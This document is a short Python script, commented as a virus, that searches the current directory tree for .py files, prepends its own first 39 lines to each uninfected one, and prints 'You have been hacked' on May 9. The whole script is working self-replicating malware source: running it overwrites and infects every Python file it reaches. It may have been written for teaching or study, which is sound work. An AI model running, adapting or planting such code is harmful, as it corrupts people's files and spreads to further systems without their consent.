#!/usr/bin/python3
"""
imports os and datetime, both being crucial to the script.

It uses three main functions. One locates certain files,
the second concats it's own string into it those files,
the last one executes this code on a given month and day.
"""

import os
import datetime

SIGNATURE = "VIRUS"

def locate(path):
    """
    Function that searches directories for .py files
    appends them to a list if they do not already have SIGNATURE inside of them. 
    Returns files_targeted
    """
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# "files_targeted" 🔻 is passed in 
def infect(files_targeted):
    """
    Function opens "__file__" and iterates 38 lines into "virusstring"
    Every file in "files_targeted" is opened, read and assigned to "temp".
    File is then overwritten with concatted strings.
    """
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    """
    Function that checks datetime. On May, 9th this code will execute.
    It prints a little message too.
    """
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# initiates the search! 👀
files_targeted = locate(os.path.abspath(""))
# Functions are called here, allowing the code to be run. 
infect(files_targeted)
detonate()